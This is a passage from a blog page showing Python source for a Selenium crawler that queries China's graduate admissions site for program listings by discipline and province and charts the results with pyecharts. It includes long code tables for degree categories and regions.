class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@author: Brian</span></span><br><span class="line"><span class="string">@file: CSCrawler.py</span></span><br><span class="line"><span class="string">@time: 2020/6/30 14:42</span></span><br><span class="line"><span class="string">@desc: 程序的主入口函数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> SchoolMapByPyEcharts <span class="keyword">import</span> SchoolMap</span><br><span class="line"><span class="keyword">from</span> ResearchDirectionsByPyEcharts <span class="keyword">import</span> ReserachDirections</span><br><span class="line"><span class="keyword">from</span> RDsBySchoolName <span class="keyword">import</span> RDsBySchoolName</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CSCrawler</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, yjxkdm)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.yjxkdm = yjxkdm</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">SchoolMap</span><span class="params">(self, mldm)</span>:</span></span><br><span class="line">        school_map = SchoolMap(self.url, mldm, self.yjxkdm)</span><br><span class="line">        driver = school_map.set_driver()</span><br><span class="line">        city_name, school_counts = school_map.select_major(driver)</span><br><span class="line"></span><br><span class="line">        school_map.visulize(city_name, school_counts)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ResearchDirection</span><span class="params">(self, count, mldm)</span>:</span></span><br><span class="line">        researdirection = ReserachDirections(self.url, count, mldm, self.yjxkdm)</span><br><span class="line">        driver = researdirection.set_driver()</span><br><span class="line"></span><br><span class="line">        x, y1, y2, flag = researdirection.select_option(driver)</span><br><span class="line"></span><br><span class="line">        researdirection.stacked_area_chart(x, y1, y2, flag)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">RDsBySchoolName</span><span class="params">(self, schoolname)</span>:</span></span><br><span class="line">        rds = RDsBySchoolName(self.url, schoolname, self.yjxkdm)</span><br><span class="line">        driver = rds.set_driver()</span><br><span class="line">        x, y1, y2, flag = rds.select_school(driver)</span><br><span class="line">        rds.stacked_area_chart(x, y1, y2, flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">""</span></span><br><span class="line">          <span class="string">"""</span></span><br><span class="line"><span class="string">          -------欢迎来到研招网专业目录信息爬虫项目-------</span></span><br><span class="line"><span class="string">                        你想做什么?</span></span><br><span class="line"><span class="string">                [1]: 目标专业的全国分布地图</span></span><br><span class="line"><span class="string">                [2]: 目标省份内个高校对相关专业的招收情况</span></span><br><span class="line"><span class="string">                [3]: 目标院校对应专业的研究方向与拟招生人数情况</span></span><br><span class="line"><span class="string">                [4]: 退出程序</span></span><br><span class="line"><span class="string">          -----------请在下方输入相关操作代码------------</span></span><br><span class="line"><span class="string">          """</span></span><br><span class="line">          <span class="string">""</span>)</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span>(flag):</span><br><span class="line">        code = input(<span class="string">"请输入操作代码："</span>).strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(code == str(<span class="number">1</span>)):</span><br><span class="line">            print(<span class="string">"正在加载目标专业的全国分布地图的程序..."</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">""</span></span><br><span class="line"></span><br><span class="line">                  <span class="string">"""</span></span><br><span class="line"><span class="string">            门类类别：</span></span><br><span class="line"><span class="string">                专业学位：</span></span><br><span class="line"><span class="string">                (zyxw)专业学位</span></span><br><span class="line"><span class="string">                ['(0251)金融', '(0252)应用统计', '(0253)税务', '(0254)国际商务', '(0255)保险', '(0256)资产评估',</span></span><br><span class="line"><span class="string">                          '(0257)审计', '(0351)法律', '(0352)社会工作', '(0353)警务', '(0451)教育', '(0452)体育',</span></span><br><span class="line"><span class="string">                          '(0453)汉语国际教育', '(0454)应用心理', '(0551)翻译', '(0552)新闻与传播', '(0553)出版',</span></span><br><span class="line"><span class="string">                          '(0651)文物与博物馆', '(0851)建筑学', '(0853)城市规划', '(0854)电子信息', '(0855)机械',</span></span><br><span class="line"><span class="string">                          '(0856)材料与化工', '(0857)资源与环境', '(0858)能源动力', '(0859)土木水利', '(0860)生物与医药',</span></span><br><span class="line"><span class="string">                          '(0861)交通运输', '(0951)农业', '(0952)兽医', '(0953)风景园林', '(0954)林业', '(1051)临床医学',</span></span><br><span class="line"><span class="string">                          '(1052)口腔医学', '(1053)公共卫生', '(1054)护理', '(1055)药学', '(1056)中药学', '(1057)中医',</span></span><br><span class="line"><span class="string">                          '(1151)军事', '(1251)工商管理', '(1252)公共管理', '(1253)会计', '(1254)旅游管理', '(1255)图书情报',</span></span><br><span class="line"><span class="string">                          '(1256)工程管理', '(1351)艺术']</span></span><br><span class="line"><span class="string">                学术学位：</span></span><br><span class="line"><span class="string">                (01)哲学</span></span><br><span class="line"><span class="string">                ['(0101)哲学']</span></span><br><span class="line"><span class="string">                (02)经济学</span></span><br><span class="line"><span class="string">                ['(0201)理论经济学', '(0202)应用经济学', '(0270)统计学']</span></span><br><span class="line"><span class="string">                (03)法学</span></span><br><span class="line"><span class="string">                ['(0301)法学', '(0302)政治学', '(0303)社会学', '(0304)民族学', '(0305)马克思主义理论', '(0306)公安学']</span></span><br><span class="line"><span class="string">                (04)教育学</span></span><br><span class="line"><span class="string">                ['(0401)教育学', '(0402)心理学', '(0403)体育学', '(0471)']</span></span><br><span class="line"><span class="string">                (05)文学</span></span><br><span class="line"><span class="string">                ['(0501)中国语言文学', '(0502)外国语言文学', '(0503)新闻传播学']</span></span><br><span class="line"><span class="string">                (06)历史学</span></span><br><span class="line"><span class="string">                ['(0601)考古学', '(0602)中国史', '(0603)世界史']</span></span><br><span class="line"><span class="string">                (07)理学</span></span><br><span class="line"><span class="string">                ['(0701)数学', '(0702)物理学', '(0703)化学', '(0704)天文学', '(0705)地理学', '(0706)大气科学', '(0707)海洋科学',</span></span><br><span class="line"><span class="string">                 '(0708)地球物理学', '(0709)地质学', '(0710)生物学', '(0711)系统科学', '(0712)科学技术史', '(0713)生态学', '</span></span><br><span class="line"><span class="string">                 (0714)统计学', '(0771)心理学', '(0772)力学', '(0773)材料科学与工程', '(0774)电子科学与技术', '(0775)计算机科学与技术',</span></span><br><span class="line"><span class="string">                 '(0776)环境科学与工程', '(0777)生物医学工程', '(0778)基础医学', '(0779)公共卫生与预防医学', '(0780)药学',</span></span><br><span class="line"><span class="string">                 '(0781)中药学', '(0782)医学技术', '(0783)护理学', '(0784)', '(0785)', '(0786)']</span></span><br><span class="line"><span class="string">                (08)工学</span></span><br><span class="line"><span class="string">                ['(0801)力学', '(0802)机械工程', '(0803)光学工程', '(0804)仪器科学与技术', '(0805)材料科学与工程', '(0806)冶金工程',</span></span><br><span class="line"><span class="string">                '(0807)动力工程及工程热物理', '(0808)电气工程', '(0809)电子科学与技术', '(0810)信息与通信工程', '(0811)控制科学与工程',</span></span><br><span class="line"><span class="string">                '(0812)计算机科学与技术', '(0813)建筑学', '(0814)土木工程', '(0815)水利工程', '(0816)测绘科学与技术',</span></span><br><span class="line"><span class="string">                '(0817)化学工程与技术', '(0818)地质资源与地质工程', '(0819)矿业工程', '(0820)石油与天然气工程', '(0821)纺织科学与工程',</span></span><br><span class="line"><span class="string">                '(0822)轻工技术与工程', '(0823)交通运输工程', '(0824)船舶与海洋工程', '(0825)航空宇航科学与技术', '(0826)兵器科学与技术',</span></span><br><span class="line"><span class="string">                '(0827)核科学与技术', '(0828)农业工程', '(0829)林业工程', '(0830)环境科学与工程', '(0831)生物医学工程',</span></span><br><span class="line"><span class="string">                '(0832)食品科学与工程', '(0833)城乡规划学', '(0834)风景园林学', '(0835)软件工程', '(0836)生物工程', '(0837)安全科学与工程',</span></span><br><span class="line"><span class="string">                '(0838)公安技术', '(0839)网络空间安全', '(0870)科学技术史', '(0871)管理科学与工程', '(0872)设计学']</span></span><br><span class="line"><span class="string">                (09)农学</span></span><br><span class="line"><span class="string">                ['(0901)作物学', '(0902)园艺学', '(0903)农业资源与环境', '(0904)植物保护', '(0905)畜牧学', '(0906)兽医学', '(0907)林学',</span></span><br><span class="line"><span class="string">                '(0908)水产', '(0909)草学', '(0970)科学技术史', '(0971)环境科学与工程', '(0972)食品科学与工程', '(0973)风景园林学']</span></span><br><span class="line"><span class="string">                (10)医学</span></span><br><span class="line"><span class="string">                ['(1001)基础医学', '(1002)临床医学', '(1003)口腔医学', '(1004)公共卫生与预防医学', '(1005)中医学', '(1006)中西医结合',</span></span><br><span class="line"><span class="string">                '(1007)药学', '(1008)中药学', '(1009)特种医学', '(1010)医学技术', '(1011)护理学', '(1071)科学技术史', '(1072)生物医学工程',</span></span><br><span class="line"><span class="string">                 '(1073)', '(1074)']</span></span><br><span class="line"><span class="string">                (11)军事学</span></span><br><span class="line"><span class="string">                ['(1101)军事思想及军事历史', '(1102)战略学', '(1103)战役学', '(1104)战术学', '(1105)军队指挥学', '(1106)军事管理学',</span></span><br><span class="line"><span class="string">                '(1107)军队政治工作学', '(1108)军事后勤学', '(1109)军事装备学', '(1110)军事训练学']</span></span><br><span class="line"><span class="string">                (12)管理学</span></span><br><span class="line"><span class="string">                ['(1201)管理科学与工程', '(1202)工商管理', '(1203)农林经济管理', '(1204)公共管理', '(1205)图书情报与档案管理']</span></span><br><span class="line"><span class="string">                (13)艺术学</span></span><br><span class="line"><span class="string">                ['(1301)艺术学理论', '(1302)音乐与舞蹈学', '(1303)戏剧与影视学', '(1304)美术学', '(1305)设计学']</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">                  <span class="string">""</span>)</span><br><span class="line">            print(<span class="string">"请根据上方对应关系输入门类类别代码、学科类别代码进行图表生成："</span>.center(<span class="number">50</span>, <span class="string">'-'</span>))</span><br><span class="line">            print(<span class="string">"例如:zyxw 0854 将会绘制开设 专业学位 电子信息 的高校在全国的分布信息"</span>.center(<span class="number">60</span>, <span class="string">'-'</span>))</span><br><span class="line">            mldm = str(input(<span class="string">"请输入门类类别代码： "</span>)).strip()</span><br><span class="line">            yjxkdm = str(input(<span class="string">"请输入学科类别代码： "</span>)).strip()</span><br><span class="line">            url = <span class="string">"https://yz.chsi.com.cn/zsml/queryAction.do"</span></span><br><span class="line">            crawler = CSCrawler(url,yjxkdm)</span><br><span class="line">            crawler.SchoolMap(mldm)</span><br><span class="line">            print(<span class="string">"正在收集数据..."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span>(code == str(<span class="number">2</span>)):</span><br><span class="line">            print(<span class="string">"正在加载目标省份内个高校对相关专业的招收情况的程序..."</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">""</span></span><br><span class="line"></span><br><span class="line">                  <span class="string">"""</span></span><br><span class="line"><span class="string">            城市代码：</span></span><br><span class="line"><span class="string">                ['(11)北京市', '(12)天津市', '(13)河北省', '(14)山西省', '(15)内蒙古自治区', '(21)辽宁省', '(22)吉林省', </span></span><br><span class="line"><span class="string">                '(23)黑龙江省', '(31)上海市', '(32)江苏省', '(33)浙江省', '(34)安徽省', '(35)福建省', '(36)江西省', '</span></span><br><span class="line"><span class="string">                (37)山东省', '(41)河南省', '(42)湖北省', '(43)湖南省', '(44)广东省', '(45)广西壮族自治区', '(46)海南省', </span></span><br><span class="line"><span class="string">                '(50)重庆市', '(51)四川省', '(52)贵州省', '(53)云南省', '(54)西藏自治区', '(61)陕西省', '(62)甘肃省', </span></span><br><span class="line"><span class="string">                '(63)青海省', '(64)宁夏回族自治区', '(65)新疆维吾尔自治区']</span></span><br><span class="line"><span class="string">            门类类别：</span></span><br><span class="line"><span class="string">                专业学位：</span></span><br><span class="line"><span class="string">                (zyxw)专业学位</span></span><br><span class="line"><span class="string">                ['(0251)金融', '(0252)应用统计', '(0253)税务', '(0254)国际商务', '(0255)保险', '(0256)资产评估',</span></span><br><span class="line"><span class="string">                          '(0257)审计', '(0351)法律', '(0352)社会工作', '(0353)警务', '(0451)教育', '(0452)体育',</span></span><br><span class="line"><span class="string">                          '(0453)汉语国际教育', '(0454)应用心理', '(0551)翻译', '(0552)新闻与传播', '(0553)出版',</span></span><br><span class="line"><span class="string">                          '(0651)文物与博物馆', '(0851)建筑学', '(0853)城市规划', '(0854)电子信息', '(0855)机械',</span></span><br><span class="line"><span class="string">                          '(0856)材料与化工', '(0857)资源与环境', '(0858)能源动力', '(0859)土木水利', '(0860)生物与医药',</span></span><br><span class="line"><span class="string">                          '(0861)交通运输', '(0951)农业', '(0952)兽医', '(0953)风景园林', '(0954)林业', '(1051)临床医学',</span></span><br><span class="line"><span class="string">                          '(1052)口腔医学', '(1053)公共卫生', '(1054)护理', '(1055)药学', '(1056)中药学', '(1057)中医',</span></span><br><span class="line"><span class="string">                          '(1151)军事', '(1251)工商管理', '(1252)公共管理', '(1253)会计', '(1254)旅游管理', '(1255)图书情报',</span></span><br><span class="line"><span class="string">                          '(1256)工程管理', '(1351)艺术']</span></span><br><span class="line"><span class="string">                学术学位：</span></span><br><span class="line"><span class="string">                (01)哲学</span></span><br><span class="line"><span class="string">                ['(0101)哲学']</span></span><br><span class="line"><span class="string">                (02)经济学</span></span><br><span class="line"><span class="string">                ['(0201)理论经济学', '(0202)应用经济学', '(0270)统计学']</span></span><br><span class="line"><span class="string">                (03)法学</span></span><br><span class="line"><span class="string">                ['(0301)法学', '(0302)政治学', '(0303)社会学', '(0304)民族学', '(0305)马克思主义理论', '(0306)公安学']</span></span><br><span class="line"><span class="string">                (04)教育学</span></span><br><span class="line"><span class="string">                ['(0401)教育学', '(0402)心理学', '(0403)体育学', '(0471)']</span></span><br><span class="line"><span class="string">                (05)文学</span></span><br><span class="line"><span class="string">                ['(0501)中国语言文学', '(0502)外国语言文学', '(0503)新闻传播学']</span></span><br><span class="line"><span class="string">                (06)历史学</span></span><br><span class="line"><span class="string">                ['(0601)考古学', '(0602)中国史', '(0603)世界史']</span></span><br><span class="line"><span class="string">                (07)理学</span></span><br><span class="line"><span class="string">                ['(0701)数学', '(0702)物理学', '(0703)化学', '(0704)天文学', '(0705)地理学', '(0706)大气科学', '(0707)海洋科学',</span></span><br><span class="line"><span class="string">                 '(0708)地球物理学', '(0709)地质学', '(0710)生物学', '(0711)系统科学', '(0712)科学技术史', '(0713)生态学', '</span></span><br><span class="line"><span class="string">                 (0714)统计学', '(0771)心理学', '(0772)力学', '(0773)材料科学与工程', '(0774)电子科学与技术', '(0775)计算机科学与技术',</span></span><br><span class="line"><span class="string">                 '(0776)环境科学与工程', '(0777)生物医学工程', '(0778)基础医学', '(0779)公共卫生与预防医学', '(0780)药学',</span></span><br><span class="line"><span class="string">                 '(0781)中药学', '(0782)医学技术', '(0783)护理学', '(0784)', '(0785)', '(0786)']</span></span><br><span class="line"><span class="string">                (08)工学</span></span><br><span class="line"><span class="string">                ['(0801)力学', '(0802)机械工程', '(0803)光学工程', '(0804)仪器科学与技术', '(0805)材料科学与工程', '(0806)冶金工程',</span></span><br><span class="line"><span class="string">                '(0807)动力工程及工程热物理', '(0808)电气工程', '(0809)电子科学与技术', '(0810)信息与通信工程', '(0811)控制科学与工程',</span></span><br><span class="line"><span class="string">                '(0812)计算机科学与技术', '(0813)建筑学', '(0814)土木工程', '(0815)水利工程', '(0816)测绘科学与技术',</span></span><br><span class="line"><span class="string">                '(0817)化学工程与技术', '(0818)地质资源与地质工程', '(0819)矿业工程', '(0820)石油与天然气工程', '(0821)纺织科学与工程',</span></span><br><span class="line"><span class="string">                '(0822)轻工技术与工程', '(0823)交通运输工程', '(0824)船舶与海洋工程', '(0825)航空宇航科学与技术', '(0826)兵器科学与技术',</span></span><br><span class="line"><span class="string">                '(0827)核科学与技术', '(0828)农业工程', '(0829)林业工程', '(0830)环境科学与工程', '(0831)生物医学工程',</span></span><br><span class="line"><span class="string">                '(0832)食品科学与工程', '(0833)城乡规划学', '(0834)风景园林学', '(0835)软件工程', '(0836)生物工程', '(0837)安全科学与工程',</span></span><br><span class="line"><span class="string">                '(0838)公安技术', '(0839)网络空间安全', '(0870)科学技术史', '(0871)管理科学与工程', '(0872)设计学']</span></span><br><span class="line"><span class="string">                (09)农学</span></span><br><span class="line"><span class="string">                ['(0901)作物学', '(0902)园艺学', '(0903)农业资源与环境', '(0904)植物保护', '(0905)畜牧学', '(0906)兽医学', '(0907)林学',</span></span><br><span class="line"><span class="string">                '(0908)水产', '(0909)草学', '(0970)科学技术史', '(0971)环境科学与工程', '(0972)食品科学与工程', '(0973)风景园林学']</span></span><br><span class="line"><span class="string">                (10)医学</span></span><br><span class="line"><span class="string">                ['(1001)基础医学', '(1002)临床医学', '(1003)口腔医学', '(1004)公共卫生与预防医学', '(1005)中医学', '(1006)中西医结合',</span></span><br><span class="line"><span class="string">                '(1007)药学', '(1008)中药学', '(1009)特种医学', '(1010)医学技术', '(1011)护理学', '(1071)科学技术史', '(1072)生物医学工程',</span></span><br><span class="line"><span class="string">                 '(1073)', '(1074)']</span></span><br><span class="line"><span class="string">                (11)军事学</span></span><br><span class="line"><span class="string">                ['(1101)军事思想及军事历史', '(1102)战略学', '(1103)战役学', '(1104)战术学', '(1105)军队指挥学', '(1106)军事管理学',</span></span><br><span class="line"><span class="string">                '(1107)军队政治工作学', '(1108)军事后勤学', '(1109)军事装备学', '(1110)军事训练学']</span></span><br><span class="line"><span class="string">                (12)管理学</span></span><br><span class="line"><span class="string">                ['(1201)管理科学与工程', '(1202)工商管理', '(1203)农林经济管理', '(1204)公共管理', '(1205)图书情报与档案管理']</span></span><br><span class="line"><span class="string">                (13)艺术学</span></span><br><span class="line"><span class="string">                ['(1301)艺术学理论', '(1302)音乐与舞蹈学', '(1303)戏剧与影视学', '(1304)美术学', '(1305)设计学']</span></span><br><span class="line"><span class="string">            """</span></span><br><span class="line">                  <span class="string">""</span>)</span><br><span class="line">            print(<span class="string">"请根据上方对应关系输入城市代码、门类类别代码、学科类别代码进行图表生成："</span>.center(<span class="number">50</span>, <span class="string">'-'</span>))</span><br><span class="line">            print(<span class="string">"例如:41 zyxw 0854 将会查询 河南省 专业学位 电子信息 的相关信息"</span>.center(<span class="number">60</span>, <span class="string">'-'</span>))</span><br><span class="line"></span><br><span class="line">            url = <span class="string">"https://yz.chsi.com.cn/zsml/queryAction.do"</span></span><br><span class="line">            count = str(input(<span class="string">"请输入城市代码： "</span>)).strip()</span><br><span class="line">            mldm = str(input(<span class="string">"请输入门类类别代码： "</span>)).strip()</span><br><span class="line">            yjxkdm = str(input(<span class="string">"请输入学科类别代码： "</span>)).strip()</span><br><span class="line">            crawler = CSCrawler(url, yjxkdm)</span><br><span class="line">            crawler.ResearchDirection(count,mldm)</span><br><span class="line">            print(<span class="string">"正在收集数据..."</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span>(code == str(<span class="number">3</span>)):</span><br><span class="line">            print(<span class="string">"正在记载目标院校对应专业的研究方向与拟招生人数情况的程序..."</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            print(<span class="string">""</span></span><br><span class="line">                  <span class="string">"""</span></span><br><span class="line"><span class="string">        请分行输入完整的学校名称与学科类别代码，如：</span></span><br><span class="line"><span class="string">            学校名称：北京大学</span></span><br><span class="line"><span class="string">            专业类别代码：0202"""</span></span><br><span class="line">                  )</span><br><span class="line">            schoolname = str(input(<span class="string">"请输入学校名称： "</span>)).strip()</span><br><span class="line">            yjxkdm = str(input(<span class="string">"请输入学科类别代码： "</span>)).strip()</span><br><span class="line">            url = <span class="string">"https://yz.chsi.com.cn/zsml/queryAction.do"</span></span><br><span class="line">            crawler = CSCrawler(url, yjxkdm)</span><br><span class="line">            crawler.RDsBySchoolName(schoolname)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"正在收集数据..."</span>)</span><br><span class="line">        <span class="keyword">elif</span>(code == str(<span class="number">4</span>)):</span><br><span class="line">            print(<span class="string">"正在退出..."</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"对不起，暂不支持此操作！请重新输入..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>SchoolMapByPyEcharts.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@author: Brian</span></span><br><span class="line"><span class="string">@file: SchoolMapByPyEcharts.py</span></span><br><span class="line"><span class="string">@time: 2020/6/26 15:06</span></span><br><span class="line"><span class="string">@desc: 重新选择爬取方法，更好的为可视化提供数据</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Map</span><br><span class="line"><span class="keyword">from</span> pyecharts.commons.utils <span class="keyword">import</span> JsCode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SchoolMap</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, mldm, yjxkdm)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.mldm = mldm</span><br><span class="line">        self.yjxkdm = yjxkdm</span><br><span class="line">        self.FlagOfProcess = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置 driver</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_driver</span><span class="params">(self)</span>:</span></span><br><span class="line">        chrome_options = Options()</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line">        driver = webdriver.Chrome(executable_path=<span class="string">"E:/Program Files/chromedriver_win32/chromedriver.exe"</span>,</span><br><span class="line">                                  chrome_options=chrome_options)</span><br><span class="line">        driver.get(self.url)</span><br><span class="line">        driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将设置屏幕大小独立出来，方便每次跳转完使用</span></span><br><span class="line">    <span class="function"><span 